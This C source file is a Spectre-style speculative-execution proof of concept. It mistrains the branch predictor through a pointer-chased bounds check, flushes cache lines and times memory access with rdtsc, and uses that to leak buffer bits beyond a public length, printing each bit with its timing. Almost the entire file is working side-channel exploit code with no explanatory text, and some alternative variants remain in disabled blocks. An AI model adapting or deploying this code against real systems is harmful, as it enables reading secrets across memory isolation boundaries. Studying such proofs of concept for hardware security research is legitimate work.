#include <stdio.h>
#include <stdalign.h>
#include <stdbool.h>
#include <x86intrin.h>
#include <string.h>

#define PUBLEN 32
#define PUBBITS (PUBLEN * 8)

int publen = PUBLEN;
char buf[PUBLEN * 2];
alignas(4096) __attribute__((section(".mysection"))) char pad = 1;
alignas(4096) __attribute__((section(".mysection"))) char flag = 1234;
alignas(4096) __attribute__((section(".mysection"))) int *p1 = &publen;
alignas(4096) __attribute__((section(".mysection"))) int **p2 = &p1;
alignas(4096) __attribute__((section(".mysection"))) int ***p3 = &p2;
alignas(4096) __attribute__((section(".mysection"))) char dummy = 1;
alignas(4096) __attribute__((section(".mysection"))) char dummy2 = 1;

static inline int get_bit_raw(int byte_idx, int bit_idx) {
  return (buf[byte_idx] >> bit_idx) & 1;
}

static __attribute__((noinline)) void probe(int byte_idx, int bit_idx) {
  if (byte_idx >= ***p3)
    return;
  // asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
  int val = get_bit_raw(byte_idx, bit_idx);
#if 0
  asm ("mov %0, %%ecx\n"
       "mov $0, %%ax\n"
       "div %%cl\n"
       : "+r"(val)
       :: "rcx", "rax", "rdx");
#endif
#if 1
  volatile int x = (&flag)[4096 - 4096 * val];
#elif 1
  volatile int x = (&flag)[val];
#endif
}

static int time_access(char *p) {
  _mm_lfence();
  unsigned long start = __rdtsc();
  char junk;
  asm volatile ("mov %1, %0" : "=r"(junk) : "m"(*p));
  _mm_lfence();
  unsigned long end = __rdtsc();
  return end - start;
}

static struct {
  int byte;
  int bit;
} order [8 * PUBLEN];

static void init(void) {
  memset(buf, -1, PUBLEN);
  strcpy(buf + PUBLEN, "div is leaky");

  for (int i = 0; i < PUBBITS; ++i) {
    int byte = i / 8;
    int bit = i % 8;
    order[i].byte = i / 8;
    order[i].bit = i % 8;
  }
}

static int leak_bit(int byte_idx, int bit_idx) {
  int idx = PUBLEN * 4;
  order[idx].byte = byte_idx;
  order[idx].bit = bit_idx;
  // Mistrain the branch predictor.
  int ts[PUBBITS];
  for (int i = 0; i < PUBBITS; ++i) {
    _mm_clflush(&flag);
    _mm_clflush(&publen);
    _mm_clflush(&p1);
    _mm_clflush(&p2);
    _mm_clflush(&p3);
    _mm_lfence();
    _mm_mfence();
    probe(order[i].byte, order[i].bit);
    ts[i] = time_access(&flag);
  }
  order[idx].byte = idx / 8;
  order[idx].bit = idx % 8;

  // Check if the flag was cached.
  int t = ts[idx];
  printf("%d\t%d\n", get_bit_raw(byte_idx, bit_idx), t);
  fflush(stdout);
}

int main() {
  init();
  for (int i = 0; i < sizeof buf; ++i) {
#if 0
    for (int j = 0; j < 8; ++j) {
      leak_bit(i, j);
    }
#else
    leak_bit(i, 0);
#endif
  }
}
